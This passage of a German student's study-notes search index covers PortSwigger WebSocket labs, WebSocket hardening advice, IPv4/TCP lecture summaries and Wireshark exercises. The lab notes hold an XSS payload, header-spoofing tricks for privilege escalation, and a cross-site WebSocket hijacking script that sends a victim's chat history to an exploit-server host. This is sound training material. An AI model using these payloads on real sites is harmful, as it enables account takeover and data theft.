\u00e4ndern und erneut senden.</li> <li>Neue Nachrichten erstellen (in beide Richtungen).</li> <li>Den Verlauf aller Nachrichten einsehen und beliebige erneut bearbeiten und senden.</li> </ul> </li> </ul>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/WebSockets%20vulnerabilities/1.%20Manipulating%20Websockets/#3-manipulation-der-websocket-verbindung-handshake","title":"3. Manipulation der WebSocket-Verbindung (Handshake)","text":"<ul> <li>Manchmal muss der Handshake selbst manipuliert werden (z. B. um mehr Angriffsfl\u00e4che zu erreichen, neue Tokens zu verwenden oder eine getrennte Verbindung neu aufzubauen).</li> <li>Im Burp Repeater:<ul> <li>Auf das Stift-Symbol neben der WebSocket-URL klicken \u2192 Wizard \u00f6ffnet sich.</li> <li>M\u00f6glichkeiten: bestehende Verbindung anh\u00e4ngen, klonen oder eine getrennte neu aufbauen.</li> <li>Handshake-Details k\u00f6nnen bearbeitet werden, bevor die Verbindung ausgef\u00fchrt wird.</li> <li>Bei Erfolg kann man \u00fcber die neue Verbindung weitere Nachrichten senden.</li> </ul> </li> </ul>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/WebSockets%20vulnerabilities/1.%20Manipulating%20Websockets/#lab-manipulating-websocket-messages-to-exploit-vulnerabilities","title":"\ud83d\udda5\ufe0f\ud83e\uddeaLab: Manipulating WebSocket messages to exploit vulnerabilities","text":"<p>To solve the lab, use a WebSocket message to trigger an\u00a0<code>alert()</code>\u00a0popup in the support agent's browser.</p> <ol> <li>Live-Chat starten</li> <li>Nachricht schicken und im intercept schauen wie die verarbeitet werden <ul> <li>Client schickt: <code>&lt;img src=1 onerror='alert(1)'&gt;</code></li> <li>Client to Server:  <pre><code>{\"message\":\"&amp;lt;img src=1 onerror=&amp;#39;alert(1)&amp;#39;&amp;gt;&amp;#x0a;\"}\n</code></pre></li> <li>Server to Client  <pre><code>{\"user\":\"You\",\n\"content\":\"&lt;img src=1 onerror='alert(1)'&gt;\"}\n</code></pre></li> </ul> </li> </ol> <p>Daran sehen wir der Client wandelt das Image in einen String um. Daher intercepten wir die Anfrage Client To Server und \u00e4ndern den Inhalt. Nachdem die Anfrage intercepted und ge\u00e4ndert wurde l\u00e4dt das Image </p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/WebSockets%20vulnerabilities/2.%20Manipulating%20Handshake-Websocket/","title":"2. Manipulating Handshake Websocket","text":"","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/WebSockets%20vulnerabilities/2.%20Manipulating%20Handshake-Websocket/#manipulation-von-websocket-traffic-mit-burp-suite","title":"Manipulation von WebSocket Traffic (mit Burp Suite)","text":"","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/WebSockets%20vulnerabilities/2.%20Manipulating%20Handshake-Websocket/#allgemein","title":"Allgemein","text":"<p>Handshakes bestehen zwar aus standardisierten Protokollen, aber weil oft eigene Logik f\u00fcr zB App Anwendungen angef\u00fcgt werden k\u00f6nnen dadurch diverse Schwachstellen entstehen.</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/WebSockets%20vulnerabilities/2.%20Manipulating%20Handshake-Websocket/#typische-schwachstellen-beim-handshake","title":"Typische Schwachstellen beim Handshake","text":"<ol> <li> <p>Blindes Vertrauen in HTTP-Header</p> <ul> <li>Beispiel: Server verl\u00e4sst sich auf <code>X-Forwarded-For</code>, um die Client-IP zu bestimmen.</li> <li>Angreifer kann im Handshake einfach <code>X-Forwarded-For: 127.0.0.1</code> setzen \u2192 Server denkt, die Anfrage kommt von <code>localhost</code>.</li> <li>\u2192 Zugriff auf interne Admin-Funktionen.</li> </ul> </li> <li> <p>Fehler bei Session Handling</p> <ul> <li>Der Server koppelt die Session f\u00fcr den WebSocket an die Cookies/Token aus dem Handshake.</li> <li>Wenn du im Burp den Cookie manipulierst, kannst du evtl. in eine fremde Session springen.</li> <li>Oder: Session wird nicht erneuert, obwohl Tokens l\u00e4ngst abgelaufen sein m\u00fcssten.</li> </ul> </li> <li> <p>Benutzerdefinierte Header</p> <ul> <li> <p>Manche Anwendungen f\u00fcgen zus\u00e4tzliche Header ins Handshake ein, z. B.:     <code>X-Auth-Token: abc123 X-Role: user</code></p> </li> <li> <p>Wenn du die manipulierst (<code>X-Role: admin</code>), und der Server vertraut darauf \u2192 \ud83d\udca5 Privilege Escalation.</p> </li> </ul> </li> </ol>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/WebSockets%20vulnerabilities/2.%20Manipulating%20Handshake-Websocket/#lab-cross-site-websocket-hijacking","title":"\ud83d\udda5\ufe0f\ud83e\uddeaLab: Cross-site WebSocket hijacking","text":"<p>This online shop has a live chat feature implemented using WebSockets. To solve the lab, use the exploit server to host an HTML/JavaScript payload that uses a cross-site WebSocket hijacking attack to exfiltrate the victim's chat history, then use this gain access to their account.</p> <ol> <li>Schauen wo Websocket verbindungen aufgebaut werden -&gt; Live Chat<ul> <li>Abchecken wie der Live-Chat kommuniziert -&gt; In Burp sehen wir in der WebSocket Historie, dass der alte Chat gespeichert wird \u00fcber die Session und mit dem Befehl \"READY\" wird dieser geladen</li> </ul> </li> <li>Handshake pr\u00fcfen (GET /chat) -&gt; Hat kein CSRF Token</li> <li>Exploit vorbereiten und auf externen Server laden und an Victim schicken</li> </ol> <pre><code>&lt;script&gt;\n    var ws = new WebSocket\n    ('wss://0adb005c03827d38813f897b001100aa.web-security-academy.net/chat');\n    ws.onopen = function() {\n        ws.send(\"READY\");\n    };\n    ws.onmessage = function(event) {\n        fetch\n        ('https://exploit-0a9000ca03697d8a810088d101db00a1.exploit-server.net/exploit message='\n        + btoa(event.data));\n    };\n&lt;/script&gt;\n</code></pre> <ol> <li>Victim hat Session laufen, dr\u00fcckt auf den Link und die gesamte Chat-Historie wird gefetched und an den externen Server geschickt</li> <li>Passwort im Chat -&gt; Leak</li> </ol>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/WebSockets%20vulnerabilities/3.%20Secure-Websockets/","title":"3. Secure Websockets","text":"","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/WebSockets%20vulnerabilities/3.%20Secure-Websockets/#sicherer-einsatz-von-websockets","title":"\ud83d\udd10 Sicherer Einsatz von WebSockets","text":"","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/WebSockets%20vulnerabilities/3.%20Secure-Websockets/#1-wss-verwenden-websockets-uber-tls","title":"1. <code>wss://</code> verwenden (WebSockets \u00fcber TLS)","text":"<ul> <li> <p>Was ist das?</p> <ul> <li><code>ws://</code> ist unverschl\u00fcsselt (wie HTTP).</li> <li><code>wss://</code> ist verschl\u00fcsselt (wie HTTPS).</li> </ul> </li> <li> <p>Warum wichtig?</p> <ul> <li>Sch\u00fctzt vor Man-in-the-Middle-Angriffen (z. B. Abh\u00f6ren im WLAN oder durch kompromittierte Router).</li> <li>Ohne TLS k\u00f6nnten Angreifer Nachrichten oder sogar den Handshake manipulieren.</li> </ul> </li> <li> <p>Praxis:</p> <ul> <li>Server mit TLS-Zertifikat betreiben.</li> <li>Client immer nur <code>wss://</code>-URLs verwenden.</li> </ul> </li> </ul>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/WebSockets%20vulnerabilities/3.%20Secure-Websockets/#2-websocket-url-hardcoden-keine-benutzereingaben-ubernehmen","title":"2. WebSocket-URL hardcoden \u2013 keine Benutzereingaben \u00fcbernehmen","text":"<ul> <li> <p>Problem:</p> <ul> <li>Wenn der Client die URL dynamisch z. B. aus Query-Parametern oder Cookies zusammenbaut, k\u00f6nnte ein Angreifer die URL manipulieren.</li> <li> <p>Beispiel:</p> <p><code>var ws = new WebSocket(\"wss://\" + location.search.split(\"=\")[1]);</code> \u2192 Angreifer h\u00e4ngt <code>?url=evil.com</code> an \u2192 Verbindung geht zu seiner Domain.</p> </li> </ul> </li> <li> <p>Warum wichtig?</p> <ul> <li>Damit verhinderst du, dass Angreifer deinen Client auf fremde, manipulierte WebSockets umleiten.</li> </ul> </li> <li> <p>Praxis:</p> <ul> <li>URL fest im Code oder in einer sicheren Config-Datei definieren.</li> <li>Keine Benutzereingaben oder unsichere Quellen f\u00fcr die Endpoint-URL zulassen.</li> </ul> </li> </ul>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/WebSockets%20vulnerabilities/3.%20Secure-Websockets/#3-handshake-gegen-csrf-absichern-schutz-vor-cross-site-websocket-hijacking","title":"3. Handshake gegen CSRF absichern (Schutz vor Cross-Site WebSocket Hijacking)","text":"<ul> <li> <p>Problem:</p> <ul> <li>Standardm\u00e4\u00dfig h\u00e4ngen Browser beim Handshake automatisch die Session-Cookies an.</li> <li>Ohne Schutz kann ein Angreifer \u00fcber eine eigene Webseite eine Verbindung im Kontext des Opfers aufbauen.</li> </ul> </li> <li> <p>L\u00f6sung:</p> <ul> <li>Wie bei normalen HTTP-Anfragen \u2192 CSRF-Token einbauen, die nur die legitime Anwendung kennen kann.</li> <li><code>Origin</code>-Header streng pr\u00fcfen \u2192 Verbindungen nur von eigenen Domains akzeptieren.</li> </ul> </li> <li> <p>Praxis:</p> <ul> <li>Beispiel:<ul> <li>Client holt sich erst ein CSRF-Token per HTTPS.</li> <li>Schickt es zus\u00e4tzlich im Handshake (z. B. als URL-Parameter oder Custom-Header).</li> <li>Server pr\u00fcft: passt Token zu Session? Wenn nein \u2192 Verbindung ablehnen.</li> </ul> </li> </ul> </li> </ul>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/WebSockets%20vulnerabilities/3.%20Secure-Websockets/#4-alle-daten-als-untrusted-behandeln-beidseitig","title":"4. Alle Daten als untrusted behandeln (beidseitig!)","text":"<ul> <li> <p>Problem:</p> <ul> <li>WebSocket-Kommunikation ist bidirektional.</li> <li>Server bekommt Daten vom Client \u2192 kann Angriffe enthalten (SQL Injection, Command Injection).</li> <li>Client bekommt Daten vom Server \u2192 k\u00f6nnte XSS oder Script Injection enthalten.</li> </ul> </li> <li> <p>Warum wichtig?</p> <ul> <li>WebSockets sind ein Transportweg \u2013 alle bekannten Input-basierenden Schwachstellen k\u00f6nnen hier auftreten.</li> </ul> </li> <li> <p>Praxis:</p> <ul> <li> <p>Server:</p> <ul> <li>Eingaben validieren, escapen, Parameterized Queries nutzen.</li> </ul> </li> <li> <p>Client:</p> <ul> <li>Daten niemals ungefiltert mit <code>.innerHTML</code> rendern.</li> <li>Immer escapen oder DOM-sicher einf\u00fcgen (<code>.textContent</code>).</li> </ul> </li> </ul> </li> </ul>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/WebSockets%20vulnerabilities/3.%20Secure-Websockets/#zusammenfassung","title":"\u2705 Zusammenfassung","text":"<p>Um WebSockets sicher zu betreiben: 1. Immer verschl\u00fcsseln (<code>wss://</code>). 2. Endpoint-URL festlegen \u2013 keine dynamischen Quellen. 3. CSRF-Schutz im Handshake \u2192 Token + Origin-Pr\u00fcfung. 4. Datenhygiene \u2192 Eingaben und Ausgaben strikt validieren und escapen.</p>","tags":["Course/"]},{"location":"studium/Rechnernetze/Vorlesungsunterlagen-Zusammenfassung/","title":"Vorlesungsunterlagen-Zusammenfassung","text":"","tags":["Course/"]},{"location":"studium/Rechnernetze/Vorlesungsunterlagen-Zusammenfassung/#vorlesungsunterlagen-zusammenfassung","title":"Vorlesungsunterlagen-Zusammenfassung","text":"","tags":["Course/"]},{"location":"studium/Rechnernetze/Vorlesungsunterlagen-Zusammenfassung/#internet-protokoll-ipv4","title":"Internet-Protokoll IPv4","text":"","tags":["Course/"]},{"location":"studium/Rechnernetze/Vorlesungsunterlagen-Zusammenfassung/#1-was-ist-ein-ip-paket-und-was-steht-im-header","title":"\u2705 1. Was ist ein IP-Paket, und was steht im Header?","text":"<p>Stell dir ein IP-Paket vor wie einen Briefumschlag mit Inhalt.</p> <ul> <li>Der Header ist der Adressaufkleber auf dem Umschlag</li> <li>Der Inhalt ist z.\u202fB. eine E-Mail, eine Webseite oder irgendwas, was du \u00fcbers Internet schickst</li> </ul>","tags":["Course/"]},{"location":"studium/Rechnernetze/Vorlesungsunterlagen-Zusammenfassung/#im-header-stehen","title":"\ud83e\uddfe Im Header stehen:","text":"<ul> <li>Absender-IP (Source IP) \u2192 Wer hat das Paket geschickt (z.\u202fB. <code>192.168.0.10</code>)</li> <li>Empf\u00e4nger-IP (Destination IP) \u2192 Wer soll es empfangen (z.\u202fB. <code>142.250.186.142</code>)</li> <li>TTL (Time to Live) \u2192 Wie oft darf das Paket noch weitergereicht werden?<ul> <li>(Reduziert sich bei jedem Hop. Festgelegter Schutzmechanismus)<ul> <li>Windows oder Linux: 64 oder 128</li> <li>Router, Sever: manchmal  255</li> </ul> </li> </ul> </li> <li>Protocol ID \u2192 Sagt, ob der Inhalt z.\u202fB. TCP oder UDP ist</li> <li>Fragment-Infos \u2192 Falls der Inhalt zu gro\u00df ist und aufgeteilt werden musste</li> </ul>","tags":["Course/"]},{"location":"studium/Rechnernetze/Vorlesungsunterlagen-Zusammenfassung/#beispiel","title":"\ud83d\udce6 Beispiel:","text":"<p>Ein Paket mit:</p> <ul> <li>Absender: <code>192.168.0.10</code></li> <li>Empf\u00e4nger: <code>8.8.8.8</code> (Google DNS)</li> <li>TTL: <code>64</code></li> <li>Protocol: <code>6</code> (TCP)</li> </ul>","tags":["Course/"]},{"location":"studium/Rechnernetze/Vorlesungsunterlagen-Zusammenfassung/#2-was-ist-die-protocol-id-und-warum-ist-sie-wichtig","title":"\ud83e\udded 2. Was ist die Protocol ID, und warum ist sie wichtig?","text":"<p>Die Protocol ID im IP-Header sagt dem Empf\u00e4nger:</p> <p>Was steckt im IP-Paket drin?</p> <p>Denn IP k\u00fcmmert sich nur um die Zustellung - was drin ist, ist ihm egal. Aber f\u00fcr die Software, die das Paket verarbeitet, ist das superwichtig.</p> Protocol ID Bedeutung 1 ICMP (z.\u202fB. Ping) 6 TCP (z.\u202fB. Webseiten, E-Mail) 17 UDP (z.\u202fB. Videos, Games)","tags":["Course/"]},{"location":"studium/Rechnernetze/Vorlesungsunterlagen-Zusammenfassung/#beispiel_1","title":"\ud83d\udee0 Beispiel:","text":"<p>Wenn im Dump steht: <code>Protocol: 6</code>, dann wei\u00dft du: \u27a1\ufe0f Es ist ein TCP-Paket \u2192 du kannst gleich schauen, ob es SYN, ACK usw. enth\u00e4lt</p>","tags":["Course/"]},{"location":"studium/Rechnernetze/Vorlesungsunterlagen-Zusammenfassung/#3-wie-funktioniert-die-kommunikation-mit-source-destination-ips","title":"\ud83d\udcec 3. Wie funktioniert die Kommunikation mit Source &amp; Destination IPs?","text":"","tags":["Course/"]},{"location":"studium/Rechnernetze/Vorlesungsunterlagen-Zusammenfassung/#grundstruktur-der-datenubertragung","title":"\ud83e\uddf1 Grundstruktur der Daten\u00fcbertragung","text":"<p>Wenn du z.\u202fB. eine Webseite \u00f6ffnest oder eine E-Mail schreibst, passiert technisch Folgendes: 1. IP-Adresse \u2192 \u201eAn welches Ger\u00e4t soll das Paket gehen?\u201c 2. Portnummer \u2192 \u201eAn welches Programm/Prozess auf diesem Ger\u00e4t?\u201c 3. Protokoll \u2192 \u201eWie sollen die Daten transportiert werden?\u201c</p> <p>Ganz einfach gesagt:</p> <ul> <li>Source IP: derjenige, der das Paket schickt</li> <li>Destination IP: derjenige, der das Paket empfangen soll</li> </ul> <p>Pakete werden versendet mit Informationen. Einzelne Router lesen die Informationen und leiten das Paket entsprechend weiter (Routing-Tabelle).  - Diese Tabelle wei\u00df welche IP zu welchem Netz geh\u00f6rt und kann es an entsprechende Provider weiterleiten die ebenfalls das Paket dann dem Zielserver zusenden weil sie sich wieder intern in ihrem Netz auskennen und n\u00f6tige Informationen haben.</p> <p>zB: (Deutschland) Heimnetz (Deutschland) Provider (Asien) Provider (Asien) Server</p> <p>\ud83d\udd01 Wichtig: Jeder Router kennt nicht den ganzen Weg, sondern nur den n\u00e4chsten sinnvollen Schritt \u2192 genau wie beim Staffellauf: immer nur an den n\u00e4chsten L\u00e4ufer \u00fcbergeben.</p> <p>Dazu kommen noch die Ports (stehen im TCP-Header):</p> Rolle IP-Adresse Port Client 192.168.0.10 54823 (zuf\u00e4llig) Server 142.250.186.142 443 (https) <p>\u27a1\ufe0f Die Kombination aus IP + Port nennt man einen Socket</p>","tags":["Course/"]},{"location":"studium/Rechnernetze/Vorlesungsunterlagen-Zusammenfassung/#beispiel-tcp-verbindung-aufbauen","title":"\ud83d\udd01 Beispiel (TCP-Verbindung aufbauen):","text":"<ol> <li>Client \u2192 Server: will sich verbinden <code>192.168.0.10:54823 \u2192 142.250.186.142:443</code></li> <li> <p>Server antwortet <code>142.250.186.142:443 \u2192 192.168.0.10:54823</code></p> </li> <li> <p>Die IP-Adresse bringt das Paket zum richtigen Ger\u00e4t</p> </li> <li>Der Port bringt es zum richtigen Programm</li> <li>Das Protokoll bestimmt den \u00dcbertragungsstil (TCP = sicher, UDP = schnell)</li> </ol>","tags":["Course/"]},{"location":"studium/Rechnernetze/Vorlesungsunterlagen-Zusammenfassung/#4-was-ist-ttl-time-to-live","title":"\ud83d\udd04 4. Was ist TTL - Time to Live?","text":"<p>TTL = Zahl im Header (z.\u202fB. 64), die verhindert, dass Pakete endlos im Netz bleiben.</p>","tags":["Course/"]},{"location":"studium/Rechnernetze/Vorlesungsunterlagen-Zusammenfassung/#warum-braucht-man-das","title":"\ud83e\udde0 Warum braucht man das?","text":"<p>Wenn sich Router falsch verkn\u00fcpfen (Schleife), k\u00f6nnte ein Paket f\u00fcr immer im Kreis laufen \u2192 Netz wird verstopft.</p>","tags":["Course/"]},{"location":"studium/Rechnernetze/Vorlesungsunterlagen-Zusammenfassung/#wie-funktioniert-ttl","title":"\ud83d\udd27 Wie funktioniert TTL?","text":"<ul> <li>Wird bei jedem Router um 1 reduziert</li> <li>Wenn TTL = 0, wird das Paket weggeworfen</li> <li>Der Absender kann eine Fehlermeldung bekommen</li> </ul>","tags":["Course/"]},{"location":"studium/Rechnernetze/Vorlesungsunterlagen-Zusammenfassung/#beispiel_2","title":"\ud83d\udce6 Beispiel:","text":"<ul> <li>Dein PC sendet Paket mit TTL = 64</li> <li>Geht \u00fcber 4 Router \u2192 kommt mit TTL = 60 beim Ziel an</li> <li>Alles okay</li> </ul>","tags":["Course/"]},{"location":"studium/Rechnernetze/Vorlesungsunterlagen-Zusammenfassung/#sonderfall","title":"\ud83d\udca5 Sonderfall:","text":"<p>Du sendest ein Paket mit TTL = 1 \u2192 \u2192 Es stirbt sofort beim ersten Router. Das nennt man TTL-Exceeded.</p>","tags":["Course/"]},{"location":"studium/Rechnernetze/Vorlesungsunterlagen-Zusammenfassung/#5-wie-erkennt-man-tcp-verbindungen-im-dump-paketmitschnitt","title":"\ud83d\udcca 5. Wie erkennt man TCP-Verbindungen im Dump (Paketmitschnitt)?","text":"","tags":["Course/"]},{"location":"studium/Rechnernetze/Vorlesungsunterlagen-Zusammenfassung/#tcp-verbindungen-der-gesprachsablauf-im-netzwerk","title":"\ud83d\udd04 TCP-Verbindungen: Der \u201eGespr\u00e4chsablauf\u201c im Netzwerk","text":"<p>TCP ist verbindungsorientiert - das hei\u00dft, bevor Daten gesendet werden, wird eine Verbindung aufgebaut, Daten \u00fcbertragen, und sauber beendet.</p> Flag Bedeutung Wann? SYN Verbindung aufbauen 1. Schritt des Handshakes ACK Best\u00e4tigung 2. &amp; 3. Schritt, \u00fcberall PSH \u201ePush\u201c - Daten sofort senden Wenn echte Daten \u00fcbertragen werden FIN Verbindung ordentlich beenden Zum Gespr\u00e4chsende RST Verbindung abrupt abbrechen z.\u202fB. Fehler oder Verweigerung","tags":["Course/"]},{"location":"studium/Rechnernetze/Vorlesungsunterlagen-Zusammenfassung/#verbindungsaufbau-3-way-handshake","title":"\ud83d\udea6 Verbindungsaufbau: 3-Way-Handshake","text":"<p>So wie man erst Hallo sagt, bevor man ein Gespr\u00e4ch beginnt, \u201ehandshaken\u201c sich zwei Rechner:</p>","tags":["Course/"]},{"location":"studium/Rechnernetze/Vorlesungsunterlagen-Zusammenfassung/#schritt-fur-schritt","title":"Schritt-f\u00fcr-Schritt:","text":"Schritt Richtung Flag Bedeutung 1 Client \u2192 Server SYN \u201eIch will verbinden, hier ist meine Startnummer\u201c 2 Server \u2192 Client SYN + ACK \u201eIch akzeptiere, hier ist meine Startnummer und ich best\u00e4tige deine\u201c 3 Client \u2192 Server ACK \u201eBest\u00e4tigung, Verbindung steht\u201c <p>\ud83e\udde0 Danach ist die Verbindung etabliert \u2192 jetzt d\u00fcrfen Daten \u00fcbertragen werden.</p>","tags":["Course/"]},{"location":"studium/Rechnernetze/Vorlesungsunterlagen-Zusammenfassung/#datenubertragung-psh-ack","title":"\ud83d\udce4 Daten\u00fcbertragung: PSH + ACK","text":"<p>Wenn der Client oder Server richtige Inhalte sendet (z.\u202fB. HTTP-Anfrage, Chatnachricht), wird das \u00fcber PSH + ACK gemacht:</p> <ul> <li> <p>PSH = \"Push\": Sende die Daten sofort, nicht puffern.</p> </li> <li> <p>ACK = Immer dabei, um zu sagen: \u201eIch habe alles bis hierher erhalten\u201c</p> </li> </ul>","tags":["Course/"]},{"location":"studium/Rechnernetze/Vorlesungsunterlagen-Zusammenfassung/#verbindungsabbau-fin-oder-rst","title":"\ud83d\udcf4 Verbindungsabbau: FIN oder RST","text":"<p>Am Ende muss das \u201eGespr\u00e4ch\u201c sauber beendet werden:</p> Szenario Flags Bedeutung Normaler Abbau FIN \u2192 ACK \u2192 FIN \u2192 ACK Beide Seiten beenden, jeder verabschiedet sich Abbruch (Fehler, Block) RST \u201eStopp sofort! Ich will/kann nicht weiter kommunizieren\u201c","tags":["Course/"]},{"location":"studium/Rechnernetze/Vorlesungsunterlagen-Zusammenfassung/#anwendung-im-tcpdump-wie-in-deiner-aufgabe","title":"\ud83e\uddea Anwendung im <code>tcpdump</code> (wie in deiner Aufgabe)","text":"<p>Wenn du einen TCP-Dump liest, kannst du z.\u202fB. sehen:</p> <pre><code>1. 56835 &gt; 50000 [SYN]         \u2192 Client startet\n2. 50000 &gt; 56835 [SYN, ACK]    \u2192 Server antwortet\n3. 56835 &gt; 50000 [ACK]         \u2192 Verbindung steht\n4. 56835 &gt; 50000 [PSH, ACK]    \u2192 Daten werden geschickt\n5. 50000 &gt; 56835 [ACK]         \u2192 Server best\u00e4tigt\n6. 50000 &gt; 56835 [PSH, ACK]    \u2192 Antwort kommt zur\u00fcck\n7. 56835 &gt; 50000 [FIN, ACK]    \u2192 Client beendet\n8. 50000 &gt; 56835 [FIN, ACK]    \u2192 Server best\u00e4tigt &amp; beendet\n</code></pre>","tags":["Course/"]},{"location":"studium/Rechnernetze/Vorlesungsunterlagen-Zusammenfassung/#was-man-wissen-sollte","title":"\ud83e\udde0 Was man wissen sollte:","text":"<ul> <li>Ohne den Handshake (SYN \u2192 SYN-ACK \u2192 ACK) kann keine TCP-Verbindung bestehen.</li> <li>ACKs kommen fast in jedem Paket vor - sie sind das R\u00fcckgrat der Zuverl\u00e4ssigkeit.</li> <li>PSH zeigt an: \u201eDas ist ein Datenpaket.\u201c</li> <li>FIN ist h\u00f6flich - RST ist hart.</li> </ul>","tags":["Course/"]},{"location":"studium/Rechnernetze/Praktisch/1.%20Wireshark%20-%20Introduction/","title":"1. Wireshark   Introduction","text":"","tags":["Course/","Rechnernetze","Semester-5","Informatik"]},{"location":"studium/Rechnernetze/Praktisch/1.%20Wireshark%20-%20Introduction/#einfuhrung-aufgabe3","title":"Einf\u00fchrung (Aufgabe3)","text":"<ol> <li>5 Erkannte Protokolle nennen<ul> <li>UDP</li> <li>SSDP</li> <li>TCP</li> <li>ARP</li> <li>TLSv1.2</li> <li>QUIC</li> <li>ICMP 3.2</li> </ul> </li> </ol> <p>3.2 117,6 ms 3.3 Internet-Adresse: 192.168.101.21  Source MAC: 00:0C:29:8D:AD:E7  Ziel MAC: 00:50:56:C0:00:01 -&gt; MAC Adresse von Router</p>","tags":["Course/","Rechnernetze","Semester-5","Informatik"]},{"location":"studium/Rechnernetze/Praktisch/1.%20Wireshark%20-%20Introduction/#schichtenmodell-isoosiaufgabe-34","title":"Schichtenmodell ISO/OSI(Aufgabe 3.4)","text":"<p>Ein HTTP-Paket nutzt folgende Protokolle: - HTTP \u2192 Application Layer (Schicht 7) - TCP \u2192 Transport Layer (Schicht 4) - IP (IPv4 oder IPv6) \u2192 Network Layer (Schicht 3) - Ethernet \u2192 Link Layer (Schicht 2)</p> <p></p>","tags":["Course/","Rechnernetze","Semester-5","Informatik"]},{"location":"studium/Rechnernetze/Praktisch/1.%20Wireshark%20-%20Introduction/#analyse-eines-http-pakets-aufgabe-4","title":"Analyse eines HTTP-Pakets: (Aufgabe 4)","text":"<p>Beispiel:</p> <p></p>","tags":["Course/","Rechnernetze","Semester-5","Informatik"]},{"location":"studium/Rechnernetze/Praktisch/1.%20Wireshark%20-%20Introduction/#filter-in-wireshark-aufgabe-5","title":"Filter in Wireshark (Aufgabe 5)","text":"<ol> <li> <p>Wie lautet der Filter, mit dem Sie \u00fcber den TCP-Port HTTPS-Verkehr filtern k\u00f6nnen?</p> <ul> <li>tcp.port == 443</li> </ul> </li> <li> <p>Vergleiche HTTP-Verkehr \u00fcber Filter: <code>http</code> und \u00fcber Filter: <code>tcp.port == 80</code></p> <ul> <li>Filter <code>http</code> zeigt nur Pakete, bei denen der HTTP-Protokoll-Parser von Wireshark tats\u00e4chlich HTTP-Inhalte erkennt.     \u2192 Z.\u202fB. <code>GET</code>, <code>POST</code>, <code>HTTP/1.1 200 OK</code> usw.</li> <li>Filter <code>tcp.port == 80</code> zeigt alle TCP-Pakete, die auf Port 80 laufen, auch wenn sie keine erkennbaren HTTP-Inhalte haben (z.\u202fB. Verbindungsaufbau mit <code>SYN</code>, <code>ACK</code>, Keep-Alive, etc.).      Der HTTP-Filter ist also protokollbasiert, w\u00e4hrend <code>tcp.port == 80</code> rein portbasiert ist.</li> </ul> </li> <li> <p>Es gibt einen Filter <code>http</code>, aber keinen Filter <code>https</code>. Haben Sie eine Idee warum?</p> <ul> <li>HTTPS ist verschl\u00fcsselter HTTP-Verkehr \u00fcber TLS<ul> <li>Wird also verschl\u00fcsselt und somit nicht mehr lesbar und daher auch kein HTTPS-Filter</li> </ul> </li> <li>ABER es gibt <code>tcp.port == 443</code></li> </ul> </li> <li> <p>Welcher Filter bewirkt, dass nur Pakete angezeigt werden, die die eigene IP-Adresse als Zieladresse haben?</p> <ul> <li>ip.dst == EIGENE IP  </li> </ul> </li> </ol>","tags":["Course/","Rechnernetze","Semester-5","Informatik"]},{"location":"studium/Rechnernetze/Praktisch/1.%20Wireshark%20-%20Introduction/#upstream-vs-downstream-aufgabe-6","title":"Upstream vs Downstream (Aufgabe 6)","text":"<p>Statiskten -&gt; Endpunkte -&gt; IPv4</p>","tags":["Course/","Rechnernetze","Semester-5","Informatik"]},{"location":"studium/Rechnernetze/Praktisch/1.%20Wireshark%20-%20Introduction/#filter-fur-downstream-vom-server-an-dich","title":"Filter f\u00fcr Downstream (vom Server an dich):","text":"<p><code>ip.dst == 192.168.178.48</code></p>","tags":["Course/","Rechnernetze","Semester-5","Informatik"]},{"location":"studium/Rechnernetze/Praktisch/1.%20Wireshark%20-%20Introduction/#filter-fur-upstream-von-dir-ins-internet","title":"Filter f\u00fcr Upstream (von dir ins Internet):","text":"<p><code>ip.src == 192.168.178.48</code></p> <p></p>","tags":["Course/","Rechnernetze","Semester-5","Informatik"]},{"location":"studium/Rechnernetze/Praktisch/1.%20Wireshark%20-%20Introduction/#wie-viele-ips-haben-daten-an-mein-rechner-gesendet-beim-aufruf","title":"Wie viele IP's haben Daten an mein Rechner gesendet beim Aufruf","text":"<p>Statiskten -&gt; Endpunkte -&gt; IPv4</p> <p>Wir haben unseren Filter eingestellt und schauen jetzt welche IP-Adressen Tx(Upstream) Pakete an uns gesendet haben. (Alle IP Adressen mit Tx Pakete &gt; 0) = 29 IP's</p> <p></p>","tags":["Course/","Rechnernetze","Semester-5","Informatik"]},{"location":"studium/Rechnernetze/Praktisch/1.%20Wireshark%20-%20Introduction/#uber-wie-viele-tcp-sockets-hat-dein-rechner-die-daten-empfangen","title":"\u00dcber wie viele TCP Sockets hat dein Rechner die Daten empfangen?","text":"<p>\ud83e\udde9 Ein TCP-Socket ist eindeutig identifiziert durch: <code>Quell-IP : Quell-Port</code> \u2192 <code>Ziel-IP : Ziel-Port</code> Das hei\u00dft: Kombination aus IP-Adressen und Ports in beide Richtungen. </p> <ul> <li>Dadurch, dass wir \u00fcberall als Quelle unsere eigene IP haben, sind wir der Client</li> <li>Nun k\u00f6nnen wir die Anzahl der Sockets mit unserer eigenen IP z\u00e4hlen<ul> <li>34 St\u00fcck</li> </ul> </li> </ul>","tags":["Course/","Rechnernetze","Semester-5","Informatik"]},{"location":"studium/Rechnernetze/Praktisch/1.%20Wireshark%20-%20Introduction/#pakete-bei-streams-aufgabe-7","title":"Pakete bei Streams (Aufgabe 7)","text":"<p><code>ip.addr == &lt;deine IP&gt; &amp;&amp; tcp.port == &lt;Port des Streams&gt;</code></p> <p>Port des streams finden wir unter - Men\u00fc: \"Statistiken\" \u2192 \"Gespr\u00e4che\" (Conversations) \u2192 TCP-Tab - Stream geht \u00fcber Port B(Unserer lokaler Port in diesem Fall) </p> <p>jetzt setzen wir:  <code>ip.addr == 192.168.178.48 &amp;&amp; tcp.port == 46169</code> ROT <code>ip.addr == 192.168.178.48 &amp;&amp; tcp.port == 443</code> BLAU</p> <p>und gehen in I/O Graph und bekommen: Rot 